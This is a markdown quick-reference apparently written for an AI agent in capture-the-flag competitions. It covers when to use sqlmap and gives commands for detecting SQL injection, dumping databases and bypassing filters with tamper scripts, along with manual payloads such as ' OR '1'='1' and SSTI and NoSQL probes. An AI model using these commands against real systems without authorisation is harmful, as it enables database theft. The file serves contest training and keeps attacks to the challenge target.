# sqlmap — Context for Claude

Quick competition reference. sqlmap runs via the terminal. The role here is to **decide whether
SQLi is the vector, capture the right request, and escalate `--level`/`--risk`/`--tamper` only when
needed** — without firing the heaviest version up front.

## Decision flow

```
Does the parameter react to ' / " (error, response change, delay)?
 ├─ no → probably not SQLi; check SSTI/NoSQL/another web vector
 └─ yes → obvious SQLi that logs in with ' OR '1'='1' ?
     ├─ yes → solve BY HAND (faster than configuring sqlmap)
     └─ no (blind/union, tedious extraction) → sqlmap:
         1. save the real request (Burp/DevTools) → sqlmap -r req.txt --batch
         2. didn't find it? → --level=5 --risk=3
         3. found it → --dbs → --tables → --columns → --dump (or --sql-query / --search)
         4. filter/WAF blocking → --tamper=space2comment,randomcase,...
```

## Quick-reference commands

```bash
sqlmap -r req.txt --batch                              # detect (saved request = more reliable)
sqlmap -u "https://target/item?id=1" --batch           # simple GET
sqlmap -r req.txt -p id --batch --level=5 --risk=3     # focus parameter + raise effort
sqlmap -r req.txt --batch --dbs                        # databases
sqlmap -r req.txt --batch -D db -T t --columns         # columns
sqlmap -r req.txt --batch -D db -T t --dump            # extract
sqlmap -r req.txt --batch --sql-query="SELECT ..."     # direct query
sqlmap -r req.txt --batch --search -C flag             # hunt for a "flag" column
sqlmap -r req.txt --batch --tamper=space2comment       # bypass a filter
sqlmap -r req.txt --batch --threads=10                 # speed up
```

## Gotchas to remember in the moment

- **Saved request (`-r`) > URL (`-u`)** — cookies/headers/session go exact; lots of false negatives
  come from an incomplete request.
- `--batch` assumes defaults and **doesn't ask** — fast, but be aware it fires payloads without
  confirmation; target only the challenge's target (rule: don't attack the platform).
- Trivial SQLi → **by hand**, not sqlmap (the setup round-trip costs more).
- Time-based is **slow** — if you already know the type, restrict with `--technique` and raise
  `--threads`.
- Extracted data may come encoded (hex/base64) — pass it to CyberChef.

## When to flag that it isn't SQLi

- The parameter doesn't react to quotes/operators, but reacts to `{{7*7}}` → **SSTI**, not SQLi.
- JSON/`$where`/`[$ne]` → **NoSQL injection** (Mongo) — sqlmap doesn't cover it well; manual
  payload.
- The "parameter" actually becomes a file path → **LFI/path traversal**, a different vector.
